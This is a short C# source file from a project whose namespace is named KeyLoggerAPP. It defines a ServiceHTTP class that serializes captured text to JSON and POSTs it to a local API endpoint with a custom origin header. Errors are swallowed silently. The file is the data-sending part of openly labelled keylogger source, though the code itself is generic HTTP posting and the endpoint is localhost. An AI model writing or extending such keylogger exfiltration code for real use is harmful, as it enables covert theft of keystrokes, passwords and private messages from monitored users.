using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace KeyLoggerAPP
{
    public class ServiceHTTP
    {
        public async static Task<bool> SendDataAsync(string text)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("X-ORIGIN", "APP2");
                var response = await httpClient.PostAsync("http://localhost:80/api/", new StringContent(JsonSerializer.Serialize(text), Encoding.UTF8, "application/json"));

                return response.IsSuccessStatusCode;
            }
            catch
            { }

            return false;
        }
    }
}
